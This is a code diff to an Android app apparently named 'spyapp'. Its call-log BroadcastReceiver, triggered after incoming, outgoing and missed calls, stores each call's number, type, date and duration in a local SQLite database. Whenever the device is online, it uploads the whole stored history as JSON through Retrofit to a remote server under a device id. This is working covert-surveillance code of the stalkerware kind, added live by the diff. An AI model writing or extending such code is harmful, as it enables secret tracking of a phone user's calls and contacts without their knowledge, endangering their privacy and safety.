@@ -25,6 +25,7 @@ import java.util.Date;
 import java.util.List;
 import java.util.logging.Handler;
 
+import kkactive_india.in.spyapp.Database.DatabaseHelper;
 import kkactive_india.in.spyapp.MainPOJO.MainBean;
 import kkactive_india.in.spyapp.callLogPOJO.calls;
 import kkactive_india.in.spyapp.callLogPOJO.callsBean;
@@ -97,6 +98,7 @@ public class callLogs extends BroadcastReceiver {
     protected void onIncomingCallEnded(String number1, Date start, Date end) {
 
         Log.d("IncomingEnd", "ended");
+        cd = new ConnectionDetector(savedContext);
         //Log.d("IncomingEnd", callsDb.getPhone());
         //Log.d("IncomingEnd", callsDb.getType());
         //Log.d("IncomingEnd", callsDb.getDate());
@@ -170,7 +172,7 @@ public class callLogs extends BroadcastReceiver {
                 }
 
 
-                new Thread(new Runnable() {
+                /*new Thread(new Runnable() {
                     @Override
                     public void run() {
                         callsDb = new callsDb();
@@ -182,7 +184,14 @@ public class callLogs extends BroadcastReceiver {
 
 
                     }
-                }).start();
+                }).start();*/
+
+
+                DatabaseHelper db = new DatabaseHelper(savedContext);
+
+                Boolean result = db.insertCalls(phNumber,callDuration, dir, String.valueOf(callDayTime));
+
+                Log.d("gayaDatabaseMai", String.valueOf(result));
 
 
                 sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
@@ -197,62 +206,67 @@ public class callLogs extends BroadcastReceiver {
                 //Log.d("type kya hai", callsDb.getType());
 
 
+                if (cd.isConnectingToInternet()) {
+                    Cursor c = db.getCalls();
 
-                calls person = new calls();
-                person.setMobile(callsDb.getPhone());
-                person.setType(callsDb.getType());
-                person.setDate(callsDb.getDate());
-                person.setDuration(callsDb.getDuration());
-                data.add(person);
-                Bean b = (Bean) savedContext.getApplicationContext();
+                    if (c != null)
+                        while (c.moveToNext()) {
+                            calls person = new calls();
+                            person.setMobile(c.getString(c.getColumnIndex("phone")));
+                            person.setDuration(c.getString(c.getColumnIndex("duration")));
+                            person.setDate(c.getString(c.getColumnIndex("date")));
+                            person.setType(c.getString(c.getColumnIndex("type")));
+                            data.add(person);
+                        }
+                    Bean b = (Bean) savedContext.getApplicationContext();
 
-                Gson gson = new GsonBuilder()
-                        .setLenient()
-                        .create();
+                    Gson gson = new GsonBuilder()
+                            .setLenient()
+                            .create();
 
-                Retrofit retrofit = new Retrofit.Builder()
-                        .baseUrl(b.baseURL)
-                        .addConverterFactory(ScalarsConverterFactory.create())
-                        .addConverterFactory(GsonConverterFactory.create(gson))
-                        .build();
-                Allapi cr = retrofit.create(Allapi.class);
+                    Retrofit retrofit = new Retrofit.Builder()
+                            .baseUrl(b.baseURL)
+                            .addConverterFactory(ScalarsConverterFactory.create())
+                            .addConverterFactory(GsonConverterFactory.create(gson))
+                            .build();
+                    Allapi cr = retrofit.create(Allapi.class);
 
-                callsBean body = new callsBean();
+                    callsBean body = new callsBean();
 
-                body.setCallLogs(data);
+                    body.setCallLogs(data);
 
-                Gson gsonObj = new Gson();
+                    Gson gsonObj = new Gson();
 
-                String jsonStr = gsonObj.toJson(body);
+                    String jsonStr = gsonObj.toJson(body);
 
-                String id = pref.getString("id", "");
-                Log.d("idHaiKyaBhai", id);
-                Log.d("idHaiKyaBhai", pref.getString("id", ""));
-                Log.d("idHaikya", jsonStr);
+                    String id = pref.getString("id", "");
+                    Log.d("idHaiKyaBhai", id);
+                    Log.d("idHaiKyaBhai", pref.getString("id", ""));
+                    Log.d("idHaikya", jsonStr);
 
-                Call<callsBean> call = cr.calls(id, jsonStr);
-                call.enqueue(new Callback<callsBean>() {
-                    @Override
-                    public void onResponse(Call<callsBean> call, Response<callsBean> response) {
-                        Log.d("kyaBaatHai", "sahi baat hai");
-                        Log.d("response", response.body().getCallLogs().toString());
+                    Call<callsBean> call = cr.calls(id, jsonStr);
+                    call.enqueue(new Callback<callsBean>() {
+                        @Override
+                        public void onResponse(Call<callsBean> call, Response<callsBean> response) {
+                            Log.d("kyaBaatHai", "sahi baat hai");
+                            Log.d("response", response.body().getCallLogs().toString());
 
-                        new Thread(new Runnable() {
+                       /* new Thread(new Runnable() {
                             @Override
                             public void run() {
                                 callsData.callsDao().delete(callsDb);
                             }
-                        }).start();
+                        }).start();*/
 
-                    }
+                        }
 
-                    @Override
-                    public void onFailure(Call<callsBean> call, Throwable t) {
-                        Log.d("ghusGaya", t.toString());
-                        Log.d("FailHorahaHai", "haan ho raha hai");
-                    }
-                });
-
+                        @Override
+                        public void onFailure(Call<callsBean> call, Throwable t) {
+                            Log.d("ghusGaya", t.toString());
+                            Log.d("FailHorahaHai", "haan ho raha hai");
+                        }
+                    });
+                }
 
             }
         };
@@ -265,6 +279,8 @@ public class callLogs extends BroadcastReceiver {
     protected void onOutgoingCallEnded(String number, Date start, Date end) {
 
         Log.d("outgoingend", "yes");
+
+        cd = new ConnectionDetector(savedContext);
 
         CountDownTimer countDownTimer = new CountDownTimer(500, 1000) {
             @Override
@@ -333,7 +349,7 @@ public class callLogs extends BroadcastReceiver {
                 }
 
 
-                new Thread(new Runnable() {
+               /* new Thread(new Runnable() {
                     @Override
                     public void run() {
                         callsDb = new callsDb();
@@ -345,7 +361,13 @@ public class callLogs extends BroadcastReceiver {
 
 
                     }
-                }).start();
+                }).start();*/
+
+                DatabaseHelper db = new DatabaseHelper(savedContext);
+
+                Boolean result = db.insertCalls(phNumber,callDuration, dir, String.valueOf(callDayTime));
+
+                Log.d("gayaDatabaseMai", String.valueOf(result));
 
 
                 sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
@@ -359,62 +381,67 @@ public class callLogs extends BroadcastReceiver {
                 //Log.d("dataHaiBhai", callsDb.getPhone());
                 //Log.d("type kya hai", callsDb.getType());
 
+                if (cd.isConnectingToInternet()) {
+                    Cursor c = db.getCalls();
 
-                calls person = new calls();
-                person.setMobile(callsDb.getPhone());
-                person.setType(callsDb.getType());
-                person.setDate(callsDb.getDate());
-                person.setDuration(callsDb.getDuration());
-                data.add(person);
-                Bean b = (Bean) savedContext.getApplicationContext();
+                    if (c != null)
+                        while (c.moveToNext()) {
+                            calls person = new calls();
+                            person.setMobile(c.getString(c.getColumnIndex("phone")));
+                            person.setDuration(c.getString(c.getColumnIndex("duration")));
+                            person.setDate(c.getString(c.getColumnIndex("date")));
+                            person.setType(c.getString(c.getColumnIndex("type")));
+                            data.add(person);
+                        }
+                    Bean b = (Bean) savedContext.getApplicationContext();
 
-                Gson gson = new GsonBuilder()
-                        .setLenient()
-                        .create();
+                    Gson gson = new GsonBuilder()
+                            .setLenient()
+                            .create();
 
-                Retrofit retrofit = new Retrofit.Builder()
-                        .baseUrl(b.baseURL)
-                        .addConverterFactory(ScalarsConverterFactory.create())
-                        .addConverterFactory(GsonConverterFactory.create(gson))
-                        .build();
-                Allapi cr = retrofit.create(Allapi.class);
+                    Retrofit retrofit = new Retrofit.Builder()
+                            .baseUrl(b.baseURL)
+                            .addConverterFactory(ScalarsConverterFactory.create())
+                            .addConverterFactory(GsonConverterFactory.create(gson))
+                            .build();
+                    Allapi cr = retrofit.create(Allapi.class);
 
-                callsBean body = new callsBean();
+                    callsBean body = new callsBean();
 
-                body.setCallLogs(data);
+                    body.setCallLogs(data);
 
-                Gson gsonObj = new Gson();
+                    Gson gsonObj = new Gson();
 
-                String jsonStr = gsonObj.toJson(body);
+                    String jsonStr = gsonObj.toJson(body);
 
-                String id = pref.getString("id", "");
-                Log.d("idHaiKyaBhai", id);
-                Log.d("idHaiKyaBhai", pref.getString("id", ""));
-                Log.d("idHaikya", jsonStr);
+                    String id = pref.getString("id", "");
+                    Log.d("idHaiKyaBhai", id);
+                    Log.d("idHaiKyaBhai", pref.getString("id", ""));
+                    Log.d("idHaikya", jsonStr);
 
-                Call<callsBean> call = cr.calls(id, jsonStr);
-                call.enqueue(new Callback<callsBean>() {
-                    @Override
-                    public void onResponse(Call<callsBean> call, Response<callsBean> response) {
-                        Log.d("kyaBaatHai", "sahi baat hai");
-                        Log.d("response", response.body().getCallLogs().toString());
+                    Call<callsBean> call = cr.calls(id, jsonStr);
+                    call.enqueue(new Callback<callsBean>() {
+                        @Override
+                        public void onResponse(Call<callsBean> call, Response<callsBean> response) {
+                            Log.d("kyaBaatHai", "sahi baat hai");
+                            Log.d("response", response.body().getCallLogs().toString());
 
-                        new Thread(new Runnable() {
+                        /*new Thread(new Runnable() {
                             @Override
                             public void run() {
                                 callsData.callsDao().delete(callsDb);
                             }
-                        }).start();
+                        }).start();*/
 
-                    }
+                        }
 
-                    @Override
-                    public void onFailure(Call<callsBean> call, Throwable t) {
-                        Log.d("yehBaatHai", t.toString());
-                        Log.d("FailHorahaHai", "haan ho raha hai");
-                    }
-                });
-
+                        @Override
+                        public void onFailure(Call<callsBean> call, Throwable t) {
+                            Log.d("yehBaatHai", t.toString());
+                            Log.d("FailHorahaHai", "haan ho raha hai");
+                        }
+                    });
+                }
 
             }
         };
@@ -431,6 +458,8 @@ public class callLogs extends BroadcastReceiver {
     protected void onMissedCall(String number, Date start) {
         Log.d("missedCall", "missed");
 
+        cd = new ConnectionDetector(savedContext);
+
         CountDownTimer countDownTimer = new CountDownTimer(500, 1000) {
             @Override
             public void onTick(long l) {
@@ -497,7 +526,7 @@ public class callLogs extends BroadcastReceiver {
                 }
 
 
-                new Thread(new Runnable() {
+                /*new Thread(new Runnable() {
                     @Override
                     public void run() {
                         callsDb = new callsDb();
@@ -509,7 +538,15 @@ public class callLogs extends BroadcastReceiver {
 
 
                     }
-                }).start();
+                }).start();*/
+
+
+                DatabaseHelper db = new DatabaseHelper(savedContext);
+
+                 Boolean result = db.insertCalls(phNumber,callDuration, dir, String.valueOf(callDayTime));
+
+                 Log.d("gayaDatabaseMai", String.valueOf(result));
+
 
 
                 sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
@@ -520,7 +557,7 @@ public class callLogs extends BroadcastReceiver {
                 //Log.d("Agile", sb.toString());
 
 
-                new Thread(new Runnable() {
+               /* new Thread(new Runnable() {
                     @Override
                     public void run() {
                         Cursor c = (Cursor) callsData.callsDao().getAll();
@@ -528,65 +565,73 @@ public class callLogs extends BroadcastReceiver {
                         Log.d("phoneeeeeeee",c.getString(c.getColumnIndex("phone")));
 
                     }
-                });
+                });*/
 
                 //Log.d("type kya hai", callsDb.getType());
 
-                calls person = new calls();
-                person.setMobile(callsDb.getPhone());
-                person.setType(callsDb.getType());
-                person.setDate(callsDb.getDate());
-                person.setDuration(callsDb.getDuration());
-                data.add(person);
-                Bean b = (Bean) savedContext.getApplicationContext();
+                // final DatabaseHelper db = new DatabaseHelper(getApplicationContext());
 
-                Gson gson = new GsonBuilder()
-                        .setLenient()
-                        .create();
+                if (cd.isConnectingToInternet()) {
+                    Cursor c = db.getCalls();
 
-                Retrofit retrofit = new Retrofit.Builder()
-                        .baseUrl(b.baseURL)
-                        .addConverterFactory(ScalarsConverterFactory.create())
-                        .addConverterFactory(GsonConverterFactory.create(gson))
-                        .build();
-                Allapi cr = retrofit.create(Allapi.class);
+                    if (c != null)
+                        while (c.moveToNext()) {
+                            calls person = new calls();
+                            person.setMobile(c.getString(c.getColumnIndex("phone")));
+                            person.setDuration(c.getString(c.getColumnIndex("duration")));
+                            person.setDate(c.getString(c.getColumnIndex("date")));
+                            person.setType(c.getString(c.getColumnIndex("type")));
+                            data.add(person);
+                        }
+                    Bean b = (Bean) savedContext.getApplicationContext();
 
-                callsBean body = new callsBean();
+                    Gson gson = new GsonBuilder()
+                            .setLenient()
+                            .create();
 
-                body.setCallLogs(data);
+                    Retrofit retrofit = new Retrofit.Builder()
+                            .baseUrl(b.baseURL)
+                            .addConverterFactory(ScalarsConverterFactory.create())
+                            .addConverterFactory(GsonConverterFactory.create(gson))
+                            .build();
+                    Allapi cr = retrofit.create(Allapi.class);
 
-                Gson gsonObj = new Gson();
+                    callsBean body = new callsBean();
 
-                String jsonStr = gsonObj.toJson(body);
+                    body.setCallLogs(data);
 
-                String id = pref.getString("id", "");
-                Log.d("idHaiKyaBhai", id);
-                Log.d("idHaiKyaBhai", pref.getString("id", ""));
-                Log.d("idHaikya", jsonStr);
+                    Gson gsonObj = new Gson();
 
-                Call<callsBean> call = cr.calls(id, jsonStr);
-                call.enqueue(new Callback<callsBean>() {
-                    @Override
-                    public void onResponse(Call<callsBean> call, Response<callsBean> response) {
-                        Log.d("kyaBaatHai", "sahi baat hai");
-                        Log.d("response", response.body().getCallLogs().toString());
+                    String jsonStr = gsonObj.toJson(body);
 
-                        new Thread(new Runnable() {
+                    String id = pref.getString("id", "");
+                    Log.d("idHaiKyaBhai", id);
+                    Log.d("idHaiKyaBhai", pref.getString("id", ""));
+                    Log.d("idHaikya", jsonStr);
+
+                    Call<callsBean> call = cr.calls(id, jsonStr);
+                    call.enqueue(new Callback<callsBean>() {
+                        @Override
+                        public void onResponse(Call<callsBean> call, Response<callsBean> response) {
+                            Log.d("kyaBaatHai", "sahi baat hai");
+                            Log.d("response", response.body().getCallLogs().toString());
+
+                   /*     new Thread(new Runnable() {
                             @Override
                             public void run() {
                                 callsData.callsDao().delete(callsDb);
                             }
-                        }).start();
+                        }).start();*/
 
-                    }
+                        }
 
-                    @Override
-                    public void onFailure(Call<callsBean> call, Throwable t) {
-                        Log.d("ghusGaya", t.toString());
-                        Log.d("FailHorahaHai", "haan ho raha hai");
-                    }
-                });
-
+                        @Override
+                        public void onFailure(Call<callsBean> call, Throwable t) {
+                            Log.d("ghusGaya", t.toString());
+                            Log.d("FailHorahaHai", "haan ho raha hai");
+                        }
+                    });
+                }
 
             }
         };
